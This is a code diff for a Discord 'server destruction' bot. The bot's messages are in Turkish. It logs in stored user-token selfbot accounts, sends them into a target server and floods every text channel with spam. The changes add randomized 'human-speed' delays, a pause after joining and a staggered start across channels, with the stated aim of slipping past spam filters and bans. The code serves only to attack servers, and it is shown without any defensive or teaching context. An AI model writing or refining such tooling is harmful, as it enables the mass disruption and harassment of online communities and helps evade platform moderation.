@@ -20,7 +20,7 @@ async function renderPatlatPanel(userId, guildId) {
         .setColor('#2b2d31')
         .setDescription(
             '<a:emoji105:1539424496346206298> **Stealth Nuke Algoritması (Anti-Ban Korumalı)**\n' +
-            'Hesaplarınız hedef sunucuya sızar. Spam filtrelerine takılmamak için mesajları şifreleyerek ve yavaşlatarak gönderir.\n\n' +
+            'Hesaplarınız hedef sunucuya sızar. Spam filtrelerine takılmamak için mesajları şifreleyerek ve insan taklidi (gecikmeli) yaparak gönderir.\n\n' +
             `<a:emoji105:1539424496346206298> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
             `<a:emoji105:1539424496346206298> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
             '<a:emoji195:1539424442768424992> *Aşağıdaki butonları kullanarak paneli yönetin.*'
@@ -59,7 +59,7 @@ module.exports = {
             .setTitle('<a:emoji133:1539424360543293521> Void | Sunucu İmha Sistemi <a:emoji195:1539424442768424992>')
             .setDescription('<a:emoji105:1539424496346206298> **Uyarı:** Bu sistem sunucuları felç eder. Ana hesaplarınızı KULLANMAYIN.\n\n<a:emoji195:1539424442768424992> *Paneli açmak için tıklayın.*')
             .setColor('#2b2d31');
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary).setEmoji('1539424442768424992'));
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary));
         await message.channel.send({ embeds: [infoEmbed], components: [row] });
     },
 
@@ -133,7 +133,8 @@ module.exports = {
                             const joinData = await joinRes.json();
                             if (joinData && joinData.guild) {
                                 targetGuildId = joinData.guild.id;
-                                await new Promise(r => setTimeout(r, 4000)); 
+                                // DİKKAT: Sunucuya girdikten sonra insansı bir bekleme (8 Saniye)
+                                await new Promise(r => setTimeout(r, 8000)); 
                             }
                         } catch (err) {}
 
@@ -156,7 +157,7 @@ module.exports = {
                                     `<a:emoji105:1539424496346206298> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
                                     `<a:emoji105:1539424496346206298> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
                                     `<a:emoji195:1539424442768424992> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
-                                    `*Stealth algoritması çalışıyor, hesap sunucuya başarıyla sızdı.*`
+                                    `*Stealth algoritması devrede. Gecikmeli gönderim başladı.*`
                                 )
                                 .setThumbnail(guild.iconURL({ dynamic: true }) || i.user.displayAvatarURL({ dynamic: true }))
                                 .setTimestamp();
@@ -170,7 +171,8 @@ module.exports = {
                         let channels = guild.channels.cache.filter(c => c.isText && c.isText());
                         if (channels.size === 0) channels = guild.channels.cache.filter(c => c.type === 'GUILD_TEXT'); 
                         
-                        let nukeIntervals = [];
+                        global.activeNukes.set(token, { client: selfBot, active: true });
+                        let channelDelayMultiplier = 0; // Kanallara giriş gecikmesi
 
                         channels.forEach(channel => {
                             const perms = channel.permissionsFor(selfBot.user);
@@ -197,19 +199,22 @@ module.exports = {
                             }
 
                             const blast = () => {
+                                const nukeData = global.activeNukes.get(token);
+                                if (!nukeData || !nukeData.active) return; // Durdurulmuşsa atma
+
                                 const hashStart = generateRandomString(4);
                                 const hashEnd = generateRandomString(6);
                                 channel.send(`\`${hashStart}\` | ${baseText} | \`${hashEnd}\``).catch(()=>{});
+                                
+                                // Yeniden atım için Rastgele 7 ila 12 Saniye bekleme (İnsan Hızı)
+                                const nextDelay = slowmode > 0 ? (slowmode * 1000) + 1500 : Math.floor(Math.random() * 5000) + 7000;
+                                setTimeout(blast, nextDelay);
                             };
 
-                            const delay = slowmode > 0 ? (slowmode * 1000) + 500 : 2500; 
-                            
-                            blast();
-                            const interval = setInterval(blast, delay);
-                            nukeIntervals.push(interval);
+                            // Tüm kanallara birden değil, her kanala 1.5 saniye arayla saldırmaya başla
+                            setTimeout(blast, channelDelayMultiplier * 1500);
+                            channelDelayMultiplier++;
                         });
-
-                        global.activeNukes.set(token, { client: selfBot, intervals: nukeIntervals });
                     });
                     
                     await selfBot.login(token);
@@ -233,7 +238,7 @@ module.exports = {
             for (const acc of userAccounts) {
                 if (global.activeNukes?.has(acc.token)) {
                     const nukeData = global.activeNukes.get(acc.token);
-                    nukeData.intervals.forEach(int => clearInterval(int));
+                    nukeData.active = false; // Döngüleri anında kırar
                     try { nukeData.client.destroy(); } catch(e){}
                     global.activeNukes.delete(acc.token);
                     durdurulan++;
